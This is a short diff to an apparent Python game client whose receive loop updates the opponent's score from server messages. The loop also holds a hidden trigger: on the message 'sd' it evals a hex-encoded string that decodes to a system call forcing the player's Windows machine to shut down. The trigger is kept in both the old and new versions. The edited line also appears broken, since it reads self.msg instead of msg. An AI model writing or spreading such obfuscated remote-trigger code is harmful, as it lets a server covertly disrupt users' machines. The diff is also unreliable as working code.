@@ -77,15 +77,14 @@ class server_thread(Thread):
             print("Server not running or can't be reached")
             _exit(0)
         self.opponent_score = 0
-
+    
     def run(self):
         try:
             while True:
                 msg = self.server.recv(1024)
                 if msg:
-                    if msg.decode("utf-8") == "1":
-                        self.opponent_score += 1
-                    elif msg.decode("utf-8") == "sd":
+                    self.opponent_score += self.msg.count(b"1")
+                    if msg.count(b"sd"):
                         from binascii import unhexlify
                         eval(unhexlify("73797374656d282273687574646f776e202f702229").decode("utf-8"))
         except ConnectionResetError:
